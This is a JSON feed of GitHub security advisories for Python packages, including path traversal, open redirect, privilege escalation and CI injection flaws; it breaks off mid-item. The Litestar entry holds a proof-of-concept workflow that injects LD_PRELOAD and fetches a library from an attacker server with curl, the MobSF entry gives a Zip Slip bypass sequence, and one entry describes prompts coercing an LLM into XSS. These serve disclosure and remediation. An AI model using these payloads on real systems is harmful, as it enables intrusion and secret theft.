{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<p>A vulnerability in corydolphin/flask-cors version 4.0.1 allows the <code>Access-Control-Allow-Private-Network</code> CORS header to be set to true by default, without any configuration option. This behavior can expose private network resources to unauthorized external access, leading to significant security risks such as data breaches, unauthorized access to sensitive information, and potential network intrusions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-6221\">https://nvd.nist.gov/vuln/detail/CVE-2024-6221</a></li>\n<li><a href=\"https://huntr.com/bounties/a42935fc-6f57-4818-bca4-3d528235df4d\">https://huntr.com/bounties/a42935fc-6f57-4818-bca4-3d528235df4d</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hxwh-jpp2-84pm\">https://github.com/advisories/GHSA-hxwh-jpp2-84pm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hxwh-jpp2-84pm",
            "title": "[flask-cors] Flask-CORS allows the `Access-Control-Allow-Private-Network` CORS header to be set to true by default",
            "date_modified": "2024-08-19T18:25:40.000Z",
            "date_published": "2024-08-18T21:31:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hxwh-jpp2-84pm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Upon reviewing the MobSF source code, I identified a flaw in the Static Libraries analysis section. Specifically, during the extraction of .a extension files, the measure intended to prevent Zip Slip attacks is improperly implemented.</p>\n<p>Since the implemented measure can be bypassed, the vulnerability allows an attacker to extract files to any desired location within the server running MobSF.</p>\n<h3 id=\"details\">Details</h3>\n<p>Upon examining lines 183-192 of the <code>mobsf/StaticAnalyzer/views/common/shared_func.py</code> file, it is observed that there is a mitigation against Zip Slip attacks implemented as <code>a.decode('utf-8', 'ignore').replace('../', '').replace('..\\\\', '')</code>. However, this measure can be bypassed using sequences like <code>....//....//....//</code>. Since the replace operation is not recursive, this sequence is transformed into <code>../../../</code> after the replace operation, allowing files to be written to upper directories.</p>\n<img src=\"https://github.com/user-attachments/assets/fadf4bcc-1a92-4655-b66a-5349278ad9c5\" alt=\"image\" width=\"448\">\n\n\n<p>For the proof of concept, I created an .a archive file that renders MobSF unusable by writing an empty file with the same name over the database located at <code>/home/mobsf/.MobSF/db.sqlite3</code>.</p>\n<img src=\"https://github.com/user-attachments/assets/54acf101-3931-401f-9970-a0934265eecb\" alt=\"poc a_1\" width=\"300\">\n\n\n<p>I am including the binary used for the POC named <code>poc.VULN</code>. To test it, you need to rename this binary to <code>poc.a</code>.</p>\n<p> <strong>Warning:</strong> As soon as you scan this file with MobSF, the database will be deleted, rendering MobSF unusable.</p>\n<p>PoC Binary File (<a href=\"https://drive.google.com/file/d/1K2eHYIZ1hUbs-Vi5zhKAKecnd0nDB8lO/view?usp=share_link\">poc.VULN</a>)</p>\n<h3 id=\"poc\">PoC</h3>\n<p><a href=\"https://github.com/user-attachments/assets/3225ccb0-cb00-47a5-8305-37a40ca1ae7f\">https://github.com/user-attachments/assets/3225ccb0-cb00-47a5-8305-37a40ca1ae7f</a></p>\n<h3 id=\"impact\">Impact</h3>\n<p>When a malicious .a file is scanned with MobSF, a critical vulnerability is present as it allows files to be extracted to any location on the server where MobSF is running. In this POC, I deleted the database, but it is also possible to achieve RCE by overwriting binaries of certain tools or by overwriting the /etc/passwd file.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-4hh3-vj32-gr6j\">https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-4hh3-vj32-gr6j</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-43399\">https://nvd.nist.gov/vuln/detail/CVE-2024-43399</a></li>\n<li><a href=\"https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/cc625fe8430f3437a473e82aa2966d100a4dc883\">https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/cc625fe8430f3437a473e82aa2966d100a4dc883</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4hh3-vj32-gr6j\">https://github.com/advisories/GHSA-4hh3-vj32-gr6j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4hh3-vj32-gr6j",
            "title": "[mobsf] Mobile Security Framework (MobSF) has a Zip Slip Vulnerability in .a Static Library Files",
            "date_modified": "2024-08-19T17:29:53.000Z",
            "date_published": "2024-08-19T17:29:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4hh3-vj32-gr6j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When WebOb normalizes the HTTP Location header to include the request hostname, it does so by parsing the URL that the user is to be redirected to with Python's urlparse, and joining it to the base URL. <code>urlparse</code> however treats a <code>//</code> at the start of a string as a URI without a scheme, and then treats the next part as the hostname. <code>urljoin</code> will then use that hostname from the second part as the hostname replacing the original one from the request.</p>\n<pre><code>&gt;&gt;&gt; parse.urlparse(\"//example.com/test/path\")\nParseResult(scheme='', netloc='example.com', path='/test/path', params='', query='', fragment='')\n</code></pre>\n<p>WebOb uses <code>urljoin</code> to take the request URI and joining the redirect location, so assuming the request URI is: <code>https://example.org//example.com/some/path</code>, and the URL to redirect to (for example by adding a slash automatically) is <code>//example.com/some/path/</code> that gets turned by <code>urljoin</code> into:</p>\n<pre><code>&gt;&gt;&gt; parse.urljoin(\"https://example.org//attacker.com/some/path\", \"//attacker.com/some/path/\")\n'https://attacker.com/some/path/'\n</code></pre>\n<p>Which redirects from <code>example.org</code> where we want the user to stay to <code>attacker.com</code></p>\n<h3 id=\"patches\">Patches</h3>\n<p>This issue is patched in WebOb 1.8.8</p>\n<p>Older versions of WebOb continue to be vulnerable to this issue, and should be avoided.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Any use of the <code>Response</code> class that includes a <code>location</code> can be rewritten to make sure to always pass a full URI that includes the hostname to redirect the user to.</p>\n<h3 id=\"thanks\">Thanks</h3>\n<ul>\n<li>Sara Gao</li>\n</ul>\n<p>This issue was reported via the <a href=\"mailto:pylons-project-security@googlegroups.com\">Pylons Project Security List</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Pylons/webob/security/advisories/GHSA-mg3v-6m49-jhp3\">https://github.com/Pylons/webob/security/advisories/GHSA-mg3v-6m49-jhp3</a></li>\n<li><a href=\"https://github.com/Pylons/webob/commit/f689bcf4f0a1f64f1735b1d5069aef5be6974b5b\">https://github.com/Pylons/webob/commit/f689bcf4f0a1f64f1735b1d5069aef5be6974b5b</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-42353\">https://nvd.nist.gov/vuln/detail/CVE-2024-42353</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mg3v-6m49-jhp3\">https://github.com/advisories/GHSA-mg3v-6m49-jhp3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mg3v-6m49-jhp3",
            "title": "[webob] WebOb's location header normalization during redirect leads to open redirect",
            "date_modified": "2024-08-14T22:17:05.000Z",
            "date_published": "2024-08-14T17:48:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mg3v-6m49-jhp3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>NLTK through 3.8.1 allows remote code execution if untrusted packages have pickled Python code, and the integrated data package download functionality is used. This affects, for example, averaged_perceptron_tagger and punkt.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-39705\">https://nvd.nist.gov/vuln/detail/CVE-2024-39705</a></li>\n<li><a href=\"https://github.com/nltk/nltk/issues/2522\">https://github.com/nltk/nltk/issues/2522</a></li>\n<li><a href=\"https://github.com/nltk/nltk/issues/3266\">https://github.com/nltk/nltk/issues/3266</a></li>\n<li><a href=\"https://github.com/nltk/nltk/commit/441aecb7d33014bd08672232c6c8bb69c2ceaba2\">https://github.com/nltk/nltk/commit/441aecb7d33014bd08672232c6c8bb69c2ceaba2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cgvx-9447-vcch\">https://github.com/advisories/GHSA-cgvx-9447-vcch</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cgvx-9447-vcch",
            "title": "[nltk] ntlk unsafe deserialization vulnerability",
            "date_modified": "2024-08-13T13:27:47.000Z",
            "date_published": "2024-06-28T00:33:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cgvx-9447-vcch"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"1-impacted-products\">1. Impacted Products</h3>\n<p>Streamilt Open Source versions before 1.37.0.</p>\n<h3 id=\"2-introduction\">2. Introduction</h3>\n<p>Snowflake Streamlit open source addressed a security vulnerability via the <a href=\"https://docs.streamlit.io/develop/concepts/configuration/serving-static-files\">static file sharing feature</a>. The vulnerability was patched on Jul 25, 2024, as part of Streamlit open source version 1.37.0. The vulnerability only affects Windows.</p>\n<h3 id=\"3-path-traversal-vulnerability\">3. Path Traversal Vulnerability</h3>\n<h4 id=\"31-description\">3.1 Description</h4>\n<p>On May 12, 2024, Streamlit was informed via our bug bounty program about a path traversal vulnerability in the open source library. We fixed and merged a patch remediating the vulnerability on Jul 25, 2024. The issue was determined to be in the moderate severity range with a maximum CVSSv3 base score of <a href=\"https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:N\">5.9</a></p>\n<h4 id=\"32-scenarios-and-attack-vectors\">3.2 Scenarios and attack vector(s)</h4>\n<p>Users of hosted Streamlit app(s) on Windows were vulnerable to a path traversal vulnerability when the <a href=\"https://docs.streamlit.io/develop/concepts/configuration/serving-static-files\">static file sharing feature</a> is enabled. An attacker could utilize the vulnerability to leak the password hash of the Windows user running Streamlit. </p>\n<h4 id=\"33-resolution\">3.3 Resolution</h4>\n<p>The vulnerability has been fixed in all Streamlit versions released since Jul 25, 2024. We recommend all users upgrade to Version 1.37.0.</p>\n<h3 id=\"4-contact\">4. Contact</h3>\n<p>Please contact <a href=\"mailto:security@snowflake.com\">security@snowflake.com</a> if you have any questions regarding this advisory. If you discover a security vulnerability in one of our products or websites, please report the issue to HackerOne. For more information, please see our <a href=\"https://hackerone.com/snowflake?type=team\">Vulnerability Disclosure Policy</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/streamlit/streamlit/security/advisories/GHSA-rxff-vr5r-8cj5\">https://github.com/streamlit/streamlit/security/advisories/GHSA-rxff-vr5r-8cj5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-42474\">https://nvd.nist.gov/vuln/detail/CVE-2024-42474</a></li>\n<li><a href=\"https://github.com/streamlit/streamlit/commit/3a639859cfdfba2187c81897d44a3e33825eb0a3\">https://github.com/streamlit/streamlit/commit/3a639859cfdfba2187c81897d44a3e33825eb0a3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rxff-vr5r-8cj5\">https://github.com/advisories/GHSA-rxff-vr5r-8cj5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rxff-vr5r-8cj5",
            "title": "[streamlit] Path traveral in Streamlit on windows",
            "date_modified": "2024-08-12T18:35:14.000Z",
            "date_published": "2024-08-12T18:35:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rxff-vr5r-8cj5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Litestar's <code>docs-preview.yml</code> workflow is vulnerable to Environment Variable injection which may lead to secret exfiltration and repository manipulation.</p>\n<h3 id=\"environment-variable-injection-ghsl-2024-177\">Environment Variable injection (<code>GHSL-2024-177</code>)</h3>\n<p>The <a href=\"https://github.com/litestar-org/litestar/blob/ffaf5616b19f6f0f4128209c8b49dbcb41568aa2/.github/workflows/docs-preview.yml\"><code>docs-preview.yml</code> workflow</a> gets triggered when the <code>Tests And Linting</code> workflow completes:</p>\n<pre><code class=\"language-yaml\">on:\n  workflow_run:\n    workflows: [Tests And Linting]\n    types: [completed]\n</code></pre>\n<p>Later, it downloads and extracts an artifact generated by the triggering workflow:</p>\n<pre><code class=\"language-yaml\">- name: Download artifact\nuses: dawidd6/action-download-artifact@v6\nwith:\n  workflow_conclusion: success\n  run_id: ${{ github.event.workflow_run.id }}\n  path: docs-preview\n  name: docs-preview\n</code></pre>\n<p>And reads <code>docs-preview/.pr_number</code> into an Environment Variable:</p>\n<pre><code class=\"language-yaml\">- name: Set PR number\n  run: echo \"PR_NUMBER=$(cat docs-preview/.pr_number)\" &gt;&gt; $GITHUB_ENV\n</code></pre>\n<p>The <code>$GITHUB_ENV</code> pointed file is just a regular file where every <code>KEY=VALUE</code> will be used to define a new Environment Variable after the step completes. Since the contents of the <code>.pr_number</code> file have not been validated, they may contain new lines that will cause new Environment Variables to be defined.</p>\n<p>An attacker can send a malicious <code>.pr_number</code> file with the following content:</p>\n<pre><code class=\"language-txt\">111\nLD_PRELOAD=/home/runner/work/litestar/litestar/inject.so\n</code></pre>\n<p>Which will result in two Environment Variables being defined:</p>\n<ul>\n<li>PR_NUMBER=111</li>\n<li>LD_PRELOAD=/home/runner/work/litestar/litestar/inject.so</li>\n</ul>\n<p>In this example we are manipulating the <code>LD_PRELOAD</code> environment variable to force the system to load a malicious shared library called <code>inject.so</code>. As a result, all subsequent processes launched will automatically incorporate this compromised library into their execution environment.</p>\n<p>The following step will run the <code>JamesIves/github-pages-deploy-action</code> action which will <a href=\"https://github.com/JamesIves/github-pages-deploy-action/blob/2c9a889f39c2410b2ca1342f465a53a7c5c389b4/action.yml#L5\">run the <code>node</code> command</a>. Therefore the <code>LD_PRELOAD</code> will execute arbitrary code when <code>node</code> gets executed:</p>\n<pre><code class=\"language-yaml\">- name: Deploy docs preview\n  uses: JamesIves/github-pages-deploy-action@v4\n  with:\n    folder: docs-preview/docs/_build/html\n    token: ${{ secrets.DOCS_PREVIEW_DEPLOY_TOKEN }}\n    repository-name: litestar-org/litestar-docs-preview\n    clean: false\n    target-folder: ${{ env.PR_NUMBER }}\n    branch: gh-pages\n</code></pre>\n<h4 id=\"poc\">PoC</h4>\n<ul>\n<li>Clone the repository</li>\n<li>Edit the <code>ci.yml</code> workflow.</li>\n</ul>\n<pre><code class=\"language-yaml\">name: Tests And Linting\n\non:\n  pull_request:\n\njobs:\n  upload-patch:\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    steps:\n      - name: Save PR number and payload\n        run: |\n          make payload\n          echo -e \"${{ github.event.number }}\\nLD_PRELOAD=/home/runner/work/litestar/litestar/inject.so\" &gt; payload/.pr_number\n          curl http://&lt;ATTACKER SERVER&gt;/inject.so -o payload/inject.so\n\n      - name: Upload artifact\n        uses: actions/upload-artifact@v3\n        with:\n          name: docs-preview\n          path: payload\n</code></pre>\n<ul>\n<li>Create a Pull Request with this change.</li>\n<li>Since the modified workflow is triggered on <code>pull_request</code>, the attacker Pull Request will trigger it and upon completion will trigger the vulnerable <code>Deploy documentation preview</code> workflow which will read the malicious artifact and pollute the Environment Variables.</li>\n</ul>\n<h4 id=\"impact\">Impact</h4>\n<p>This issue will grant a malicious actor the <a href=\"https://github.com/litestar-org/litestar/actions/runs/10081936962/job/27875077668#step:1:17\">following permissions</a>:</p>\n<pre><code>  Issues: write\n  Metadata: read\n  PullRequests: write\n</code></pre>\n<p>In addition, the following secret will get exposed to the attacker: <code>DOCS_PREVIEW_DEPLOY_TOKEN</code></p>\n<h4 id=\"remediation\">Remediation</h4>\n<ul>\n<li>Verify the contents of the downloaded artifacts.</li>\n<li>Do not allow new lines in the value redirected to GITHUB_ENV</li>\n</ul>\n<h3 id=\"resources\">Resources</h3>\n<ul>\n<li><a href=\"https://codeql.github.com/codeql-query-help/javascript/js-actions-command-injection/\">CodeQL for JavaScript - Expression injection in Actions</a></li>\n<li><a href=\"https://securitylab.github.com/research/github-actions-untrusted-input/\">Keeping your GitHub Actions and workflows secure Part 2: Untrusted input</a></li>\n<li><a href=\"https://securitylab.github.com/research/github-actions-preventing-pwn-requests/\">Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests</a></li>\n</ul>\n<h2 id=\"disclosure-policy\">Disclosure Policy</h2>\n<p>This report is subject to a 90-day disclosure deadline, as described in more detail in our <a href=\"https://securitylab.github.com/advisories#policy\">coordinated disclosure policy</a>.</p>\n<h2 id=\"note-on-vulnerability-severity\">Note on vulnerability severity</h2>\n<p>This global advisory lists the vulnerability at <code>low</code> severity while the repository advisory and CVE record list the vulnerability at <code>high</code> severity because the confidentiality, integrity, and availability impacts of the vulnerability affect Litestar's CI/CD environment rather than the <code>litestar</code> package.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/litestar-org/litestar/security/advisories/GHSA-4hq2-rpgc-r8r7\">https://github.com/litestar-org/litestar/security/advisories/GHSA-4hq2-rpgc-r8r7</a></li>\n<li><a href=\"https://github.com/litestar-org/litestar/commit/84d351e96aaa2a1338006d6e7221eded161f517b\">https://github.com/litestar-org/litestar/commit/84d351e96aaa2a1338006d6e7221eded161f517b</a></li>\n<li><a href=\"https://github.com/litestar-org/litestar/blob/ffaf5616b19f6f0f4128209c8b49dbcb41568aa2/.github/workflows/docs-preview.yml\">https://github.com/litestar-org/litestar/blob/ffaf5616b19f6f0f4128209c8b49dbcb41568aa2/.github/workflows/docs-preview.yml</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-42370\">https://nvd.nist.gov/vuln/detail/CVE-2024-42370</a></li>\n<li><a href=\"https://github.com/litestar-org/litestar/actions/runs/10081936962/job/27875077668#step:1:17\">https://github.com/litestar-org/litestar/actions/runs/10081936962/job/27875077668#step:1:17</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4hq2-rpgc-r8r7\">https://github.com/advisories/GHSA-4hq2-rpgc-r8r7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4hq2-rpgc-r8r7",
            "title": "[litestar] Litestar has an environment Variable injection in `docs-preview.yml` workflow",
            "date_modified": "2024-08-12T16:02:01.000Z",
            "date_published": "2024-08-09T19:22:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4hq2-rpgc-r8r7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A path traversal vulnerability exists in the <code>_create_model_version()</code> function within <code>server/handlers.py</code> of the mlflow/mlflow repository, due to improper validation of the <code>source</code> parameter. Attackers can exploit this vulnerability by crafting a <code>source</code> parameter that bypasses the <code>_validate_non_local_source_contains_relative_paths(source)</code> function's checks, allowing for arbitrary file read access on the server. The issue arises from the handling of unquoted URL characters and the subsequent misuse of the original <code>source</code> value for model version creation, leading to the exposure of sensitive files when interacting with the <code>/model-versions/get-artifact</code> handler.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1558\">https://nvd.nist.gov/vuln/detail/CVE-2024-1558</a></li>\n<li><a href=\"https://huntr.com/bounties/7f4dbcc5-b6b3-43dd-b310-e2d0556a8081\">https://huntr.com/bounties/7f4dbcc5-b6b3-43dd-b310-e2d0556a8081</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j62r-wxqq-f3gf\">https://github.com/advisories/GHSA-j62r-wxqq-f3gf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j62r-wxqq-f3gf",
            "title": "[mlflow] mlflow vulnerable to Path Traversal",
            "date_modified": "2024-08-09T18:07:48.000Z",
            "date_published": "2024-04-16T00:30:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j62r-wxqq-f3gf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A path traversal vulnerability exists in mlflow/mlflow version 2.9.2, allowing attackers to access arbitrary files on the server. By crafting a series of HTTP POST requests with specially crafted 'artifact_location' and 'source' parameters, using a local URI with '#' instead of '?', an attacker can traverse the server's directory structure. The issue occurs due to insufficient validation of user-supplied input in the server's handlers.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1483\">https://nvd.nist.gov/vuln/detail/CVE-2024-1483</a></li>\n<li><a href=\"https://huntr.com/bounties/52a3855d-93ff-4460-ac24-9c7e4334198d\">https://huntr.com/bounties/52a3855d-93ff-4460-ac24-9c7e4334198d</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f82r-jj5r-6g97\">https://github.com/advisories/GHSA-f82r-jj5r-6g97</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f82r-jj5r-6g97",
            "title": "[mlflow] mlflow Path Traversal vulnerability",
            "date_modified": "2024-08-09T18:06:42.000Z",
            "date_published": "2024-04-16T00:30:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f82r-jj5r-6g97"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Static routes which contain files with compressed variants (<code>.gz</code> or <code>.br</code> extension) were vulnerable to path traversal outside the root directory if those variants are symbolic links.</p>\n<h3 id=\"details\">Details</h3>\n<p>The server protects static routes from path traversal outside the root directory when <code>follow_symlinks=False</code> (default).  It does this by resolving the requested URL to an absolute path and then checking that path relative to the root.  However, these checks are not performed when looking for compressed variants in the <code>FileResponse</code> class, and symbolic links are then automatically followed when performing <code>Path.stat()</code> and <code>Path.open()</code> to send the file.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Servers with static routes that contain compressed variants as symbolic links, pointing outside the root directory, or that permit users to upload or create such links, are impacted.</p>\n<hr>\n<p>Patch: <a href=\"https://github.com/aio-libs/aiohttp/pull/8653/files\">https://github.com/aio-libs/aiohttp/pull/8653/files</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/aio-libs/aiohttp/security/advisories/GHSA-jwhx-xcg6-8xhj\">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-jwhx-xcg6-8xhj</a></li>\n<li><a href=\"https://github.com/aio-libs/aiohttp/pull/8653\">https://github.com/aio-libs/aiohttp/pull/8653</a></li>\n<li><a href=\"https://github.com/aio-libs/aiohttp/commit/ce2e9758814527589b10759a20783fb03b98339f\">https://github.com/aio-libs/aiohttp/commit/ce2e9758814527589b10759a20783fb03b98339f</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-42367\">https://nvd.nist.gov/vuln/detail/CVE-2024-42367</a></li>\n<li><a href=\"https://github.com/aio-libs/aiohttp/blob/e0ff5246e1d29b7710ab1a2bbc972b48169f1c05/aiohttp/web_fileresponse.py#L177\">https://github.com/aio-libs/aiohttp/blob/e0ff5246e1d29b7710ab1a2bbc972b48169f1c05/aiohttp/web_fileresponse.py#L177</a></li>\n<li><a href=\"https://github.com/aio-libs/aiohttp/blob/e0ff5246e1d29b7710ab1a2bbc972b48169f1c05/aiohttp/web_urldispatcher.py#L674\">https://github.com/aio-libs/aiohttp/blob/e0ff5246e1d29b7710ab1a2bbc972b48169f1c05/aiohttp/web_urldispatcher.py#L674</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jwhx-xcg6-8xhj\">https://github.com/advisories/GHSA-jwhx-xcg6-8xhj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jwhx-xcg6-8xhj",
            "title": "[aiohttp] In aiohttp, compressed files as symlinks are not protected from path traversal",
            "date_modified": "2024-08-12T16:02:22.000Z",
            "date_published": "2024-08-09T16:49:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jwhx-xcg6-8xhj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The mlflow web server includes tools for tracking experiments, packaging code into reproducible runs, and sharing and deploying models. As this vulnerability allows to write / overwrite any file on the file system, it gives a lot of ways to archive code execution (like overwriting <code>/home/&lt;user&gt;/.bashrc</code>). A malicious user could use this issue to get command execution on the vulnerable machine and get access to data &amp; models information.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-6018\">https://nvd.nist.gov/vuln/detail/CVE-2023-6018</a></li>\n<li><a href=\"https://huntr.com/bounties/7cf918b5-43f4-48c0-a371-4d963ce69b30\">https://huntr.com/bounties/7cf918b5-43f4-48c0-a371-4d963ce69b30</a></li>\n<li><a href=\"https://github.com/mlflow/mlflow/commit/55c72d02380e8db8118595a4fdae7879cb7ac5bd\">https://github.com/mlflow/mlflow/commit/55c72d02380e8db8118595a4fdae7879cb7ac5bd</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5p3h-7fwh-92rc\">https://github.com/advisories/GHSA-5p3h-7fwh-92rc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5p3h-7fwh-92rc",
            "title": "[mlflow] Remote Code Execution due to Full Controled File Write in mlflow",
            "date_modified": "2024-08-08T20:05:59.000Z",
            "date_published": "2023-11-16T18:30:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5p3h-7fwh-92rc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Attackers can craft a malicious prompt that coerces the language model into executing arbitrary JavaScript in the context of the web page.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-6706\">https://nvd.nist.gov/vuln/detail/CVE-2024-6706</a></li>\n<li><a href=\"https://korelogic.com/Resources/Advisories/KL-001-2024-005.txt\">https://korelogic.com/Resources/Advisories/KL-001-2024-005.txt</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5jp3-wp5v-5363\">https://github.com/advisories/GHSA-5jp3-wp5v-5363</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5jp3-wp5v-5363",
            "title": "[open-webui] Open WebUI Stored Cross-Site Scripting Vulnerability",
            "date_modified": "2024-08-08T16:30:18.000Z",
            "date_published": "2024-08-08T00:31:44.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5jp3-wp5v-5363"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>If a user is granted the <code>admin:users</code> scope, they may escalate their own privileges by making themselves a full admin user.</p>\n<h3 id=\"details\">Details</h3>\n<p>The <code>admin:users</code> scope allows a user to edit user records:</p>\n<blockquote>\n<p>admin:users</p>\n<p>Read, write, create and delete users and their authentication state, not including their servers or tokens.</p>\n<p>-- <a href=\"https://jupyterhub.readthedocs.io/en/stable/rbac/scopes.html#available-scopes\">https://jupyterhub.readthedocs.io/en/stable/rbac/scopes.html#available-scopes</a></p>\n</blockquote>\n<p>However, this includes making users admins. Admin users are granted scopes beyond <code>admin:users</code> making this a mechanism by which granted scopes may be escalated.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>The impact is relatively small in that <code>admin:users</code> is already an extremely privileged scope only granted to trusted users.\nIn effect, <code>admin:users</code> is equivalent to <code>admin=True</code>, which is not intended.</p>\n<p>Note that the change here only prevents escalation to the built-in JupyterHub admin role that has unrestricted permissions. It does not prevent users with e.g. <code>groups</code> permissions from granting themselves or other users permissions via group membership, which is intentional.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyterhub/jupyterhub/security/advisories/GHSA-9x4q-3gxw-849f\">https://github.com/jupyterhub/jupyterhub/security/advisories/GHSA-9x4q-3gxw-849f</a></li>\n<li><a href=\"https://github.com/jupyterhub/jupyterhub/commit/99e2720b0fc626cbeeca3c6337f917fdacfaa428\">https://github.com/jupyterhub/jupyterhub/commit/99e2720b0fc626cbeeca3c6337f917fdacfaa428</a></li>\n<li><a href=\"https://github.com/jupyterhub/jupyterhub/commit/ff2db557a85b6980f90c3158634bf924063ab8ba\">https://github.com/jupyterhub/jupyterhub/commit/ff2db557a85b6980f90c3158634bf924063ab8ba</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41942\">https://nvd.nist.gov/vuln/detail/CVE-2024-41942</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9x4q-3gxw-849f\">https://github.com/advisories/GHSA-9x4q-3gxw-849f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9x4q-3gxw-849f",
            "title": "[jupyterhub] JupyterHub has a privilege escalation vulnerability with the `admin:users` scope",
            "date_modified": "2024-08-08T16:59:55.000Z",
            "date_published": "2024-08-08T14:37:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9x4q-3gxw-849f"
            },
            "tags": [
                "severity"
            ]
        },
        {
